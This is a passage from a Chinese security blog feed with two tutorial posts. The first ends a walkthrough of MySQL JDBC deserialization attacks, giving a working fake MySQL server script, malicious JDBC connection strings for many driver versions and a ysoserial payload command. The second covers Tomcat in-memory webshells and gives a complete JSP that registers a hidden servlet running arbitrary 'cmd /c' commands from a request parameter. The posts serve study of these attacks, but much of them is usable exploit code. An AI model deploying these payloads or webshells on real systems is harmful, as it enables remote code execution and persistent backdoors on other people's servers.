class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span><br>            receive_data(conn)<br>            send_data(conn,response_ok_data)<br><br>            <span class="hljs-comment">#其他过程</span><br>            data=receive_data(conn)<br>            <span class="hljs-comment">#查询一些配置信息,其中会发送自己的 版本号</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload=<span class="hljs-string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span><br>                send_data(conn,_payload)<br>                data=receive_data(conn)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br>                send_data(conn, _payload)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:<br>                mysql_data = <span class="hljs-string">&#x27;0100000102&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                <span class="hljs-comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span><br>                <span class="hljs-comment">#获取payload</span><br>                payload_content=get_payload_content()<br>                <span class="hljs-comment">#计算payload长度</span><br>                payload_length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">4</span>)<br>                payload_length_hex = payload_length[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + payload_length[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                <span class="hljs-comment">#计算数据包长度</span><br>                data_len = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">6</span>)<br>                data_len_hex = data_len[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + data_len[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + data_len[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                mysql_data += data_len_hex + <span class="hljs-string">&#x27;04&#x27;</span> + <span class="hljs-string">&#x27;fbfc&#x27;</span>+ payload_length_hex<br>                mysql_data += <span class="hljs-built_in">str</span>(payload_content)<br>                mysql_data += <span class="hljs-string">&#x27;07000005fe000022000100&#x27;</span><br>                send_data(conn, mysql_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br>                send_data(conn, payload)<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    HOST =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>    PORT = <span class="hljs-number">3309</span><br><br>    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <span class="hljs-comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span><br>    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    sk.bind((HOST, PORT))<br>    sk.listen(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST,PORT))<br><br>    run()<br></code></pre></td></tr></table></figure><p>Client</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ServerStatusDiffInterceptor;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">driver</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">DB_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span>;<span class="hljs-comment">//8.x使用</span><br>        Class.forName(driver);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(DB_URL);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后生成一个cc7的payload文件放在poc的目录下</p><blockquote><p>卧槽这有个奇怪的坑，ysoserial生成payload的时候命令不能用引号括起来，不然就报错了，反正我是这样的（</p><p>要这样写：</p><p>java -jar ysoserial-all.jar CommonsCollections7 calc &gt; a</p></blockquote><p>执行效果</p><p><img src="https://cdn.clown2024.cn/202410012339938.png" alt="image-20241001233903839"></p><p><img src="https://cdn.clown2024.cn/202410012339163.png" alt="image-20241001233926085"></p><p>然后8.0.20之后不再调用resultSetToMap方法，也就是不再调用getObject方法了，所以这条链也就打不通了</p><h2 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h2><p>参考文章：<a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p>先说一下由于版本不同带来的改变</p><ol><li>从6.0开始主要使用的包名从·<code>com.mysql</code>变为了<code>com.mysql.cj</code>,所以<code>ServerStatusDiffInterceptor</code>所在位置也有所改变。</li><li>5.1.11-6.0.6使用的interceptors属性为statementInterceptors，8.0以上使用的为queryInterceptors。</li><li>5.1.11以下，无法直接通过连接触发：在执行getConnection时，会执行到com.mysql.jdbc.ConnectionImpl中</li></ol><p>各版本最后都是需要到getObject方法里面去进行反序列化</p><h3 id="510-5110"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h3><p>连接串如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><p>连接之后需要执行查询</p><h3 id="5111-5xxx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h3><p>连接串如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h3 id="6x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><p>连接串如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h1 id="detectcustomcollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h1><h2 id="各版本连接串"><a href="#各版本连接串" class="headerlink" title="各版本连接串"></a>各版本连接串</h2><p>先给出各版本的连接串</p><ul><li>5.1.19-5.1.28：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.48：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.49：不可用</li><li>6.0.2-6.0.6：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>8.x.x ：不可用</li></ul><p>该链子反序列化的点也是在resultSetToMap()方法里面</p><p>payload的不同主要在于有些版本会对detectCustomCollations参数进行校验之后才会到反序列化点里面去。</p><h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="5119-5140"><a href="#5-1-19-5-1-40" class="headerlink" title="5.1.19-5.1.40"></a>5.1.19-5.1.40</h3><p>这里的利用利用链比较简单，在getConnection的时候会调用到**com.mysql.jdbc.ConnectionImpl#buildCollationMapping()**方法</p><p><img src="https://cdn.clown2024.cn/202410030920363.png" alt="image-20241003092042235"></p><p>这里执行了SHOW COLLATION查询语句，然后调用了resultSetToMap</p><h3 id="5141-5148"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h3><p>该版本的buildCollationMapping()方法不再调用resultSetToMap方法，但是直接调用了getObject方法，所以payload也没变化</p><p><img src="https://cdn.clown2024.cn/202410030924201.png" alt="image-20241003092445101"></p><h3 id="5149"><a href="#5-1-49" class="headerlink" title="5.1.49"></a>5.1.49</h3><p>该版本就不再调用getObject方法，所以链子也就不可用了</p><h3 id="602-606"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h3><p>该版本resultSetToMap又回来了</p><p><img src="https://cdn.clown2024.cn/202410030933152.png" alt="image-20241003093358073"></p><h3 id="8xx"><a href="#8-x-x" class="headerlink" title="8.x.x"></a>8.x.x</h3><p>8.0以上不再在com.mysql.cj.jdbc.ConnectionImpl中直接执行及获取”SHOW COLLATION”语句，调用链更改，不再调用getObject()方法，此链失效</p><h1 id="mysql恶意服务器"><a href="#mysql恶意服务器" class="headerlink" title="mysql恶意服务器"></a>mysql恶意服务器</h1><p>起恶意的mysql服务还可以用fnmsd师傅的<a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server项目</a>（这个我没跑起来）</p><p>还推荐一个java写的带gui的项目：<a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来学一下常见的JDBC反序列化，是MYSQL的，参考文章：&lt;a href=&quot;https://tttang.com/archive/1877/&quot;&gt;https://tttang.com/archive/1877/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;jdbc简单介绍&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>传统web应用型内存马</title>
    <link href="https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T14:31:10.000Z</published>
    <updated>2024-09-20T15:19:53.070Z</updated>
    
    <content type="html"><![CDATA[<p>这里是本菜鸡开始学习内存马的起始文章</p><p>有关内存马的认知可以看看su18师傅的这篇文章：<a href="https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ">https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ</a></p><p>有关tomcat源码分析的文章：<a href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcat源码初识一 Tomcat整理流程图_tomcat流程图-CSDN博客</a></p><p>然后这里有一篇总结得特别全得内存马文章：<a href="https://paper.seebug.org/3120/">https://paper.seebug.org/3120/</a></p><p>这里放一张文章中的源码分析的初始化流程图：</p><p><img src="https://cdn.clown2024.cn/202409161536558.png" alt="内存马流程"></p><p>做个参考对大致流程有个概念</p><blockquote><p> 调试的时候我突然发现不应该开启tomcat的自动打开浏览器，这样调试访问前或者访问后的逻辑是才不会那么乱😢</p><p> 因为他默认是在我们访问后才会去创建实例</p></blockquote><h1 id="servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h1><h2 id="简单demo"><a href="#简单demo" class="headerlink" title="简单demo"></a>简单demo</h2><p>先写一个简单的demo然后再分析一下原理吧，先看看效果</p><blockquote><p>这里用了使用了tomcat8，tomcat10用那个demo有些类找不到</p><p>要看源码的话需要导入对应tomcat版本的依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.50<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这是tomcat的核心依赖，起服务的过程源码基本都在这里</p></blockquote><p>编写一个servlet内存马的步骤：</p><ul><li>找到StandardContext</li><li>继承并编写一个恶意servlet</li><li>创建Wapper对象</li><li>设置Servlet的LoadOnStartUp的值</li><li>设置Servlet的Name</li><li>设置Servlet对应的Class</li><li>将Servlet添加到context的children中</li><li>将url路径和servlet类做映射</li></ul><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.Servlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/&quot;</span> + getRandomString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Servlet&quot;</span> + getRandomString();<br>        <span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>                    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>                    out.println(output);<br>                    out.flush();<br>                    out.close();<br>                &#125;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>            &#125;<br>        &#125;;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>        wrapper.setName(servletName);<br>        wrapper.setServlet(servlet);<br>        wrapper.setServletClass(servlet.getClass().getName());<br>        wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>        standardContext.addChild(wrapper);<br>        standardContext.addServletMappingDecoded(servletURL, servletName);<br>        response.getWriter().write(<span class="hljs-string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot;</span> + servletURL + <span class="hljs-string">&quot;?cmd=echo 世界，你好！&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> e.getMessage();<br>        response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">outError</span> <span class="hljs-operator">=</span> response.getWriter();<br>        outError.println(<span class="hljs-string">&quot;Error: &quot;</span> + errorMessage);<br>        outError.flush();<br>        outError.close();<br>    &#125;<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;%!<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getRandomString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">characters</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">randomString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.random() * characters.length());<br>            randomString.append(characters.charAt(index));<br>        &#125;<br>        <span class="hljs-keyword">return</span> randomString.toString();<br>    &#125;<br>%&gt;<br><br></code></pre></td></tr></table></figure><p>打入后效果</p><p><img src="https://cdn.clown2024.cn/202409161601686.png" alt="image-20240916160158629"></p><p>然后就可以去访问对应路由执行命令</p><p><img src="https://cdn.clown2024.cn/202409161602929.png" alt="image-20240916160242879"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>servlet内存马就是去找到源码中注册servlet的内容，然后我们重复一遍直接注册自己的servlet即可</p><p>这里我们是去找源码中如何将web.xml的配置变成servlet的过程</p><p>首先找到加载web.xml的ContextConfig#webconfig()</p><p><img src="https://cdn.clown2024.cn/202409161629329.png" alt="image-20240916162907251"></p><p>然后里面就是读取web.xml的一些代码，重要在第九个步骤</p><p><img src="https://cdn.clown2024.cn/202409161630551.png" alt="image-20240916163037486"></p><p>这里注释将web.xml应用于Context，调用ContextConfig#configureContext方法</p><p>跟进去看一看</p><p><img src="https://cdn.clown2024.cn/202409161637697.png" alt="image-20240916163737624"></p><p>这里有很多的操作都是通过context加载进去，这里的context就是我们的StandardContext，tomcat每个容器启动时都会通过一个Standard***#startInternal()方法来启动，所以我们具体的context就是StandardContext开始的，我们可以调试看看这个context</p><p><img src="https://cdn.clown2024.cn/202409161650754.png" alt="image-20240916165022674"></p><p>可以看到是我们的StandardContext，然后这个webxml里面就有解析我们web.xml文件拿到的servlet</p><p><img src="https://cdn.clown2024.cn/202409161651016.png" alt="image-20240916165127949"></p><p>这个Hello就是我们自己注册的，<strong>所以第一步的找到StandardContext，其实就是获取当前应用的context实例</strong>，然后往里面注册servlet，我们回到configureContext方法继续往下找关键地方</p><p><img src="https://cdn.clown2024.cn/202409161658274.png" alt="image-20240916165818197"></p><p>这里遍历我们的servlet然后创建wrapper，我们知道wrapper就是用来封装servlet的</p><p><img src="https://cdn.clown2024.cn/202409161701466.png" alt="image-20240916170126390"></p><p>然后这里的wrapper就是我们知道的tomcat定义的Wrapper的实现类，拿到wrapper之后继续往下，看一下关键的set方法</p><p><img src="https://cdn.clown2024.cn/202409161708368.png" alt="image-20240916170822326"></p><p>第一步先对loadOnStartup的值进行设置，这个值代表的是Servlet在启动时的加载顺序，如果设置为负数，那么Servlet将在第一次请求时才被加载</p><p><img src="https://cdn.clown2024.cn/202409161715978.png" alt="image-20240916171559932"></p><p>这一步就是这是servlet的name</p><p><img src="https://cdn.clown2024.cn/202409161716418.png" alt="image-20240916171636372"></p><p>这一步设置servletClass用的是全类名</p><p><img src="https://cdn.clown2024.cn/202409161719067.png" alt="image-20240916171908029"></p><p>这一步将前面的wrapper添加到context里面</p><p><img src="https://cdn.clown2024.cn/202409161721789.png" alt="image-20240916172036567"></p><p>然后这是将前面的servlet遍历完之后，再遍历servletMapping，往context里面添加映射，下面是servletMappings</p><p><img src="https://cdn.clown2024.cn/202409161722241.png" 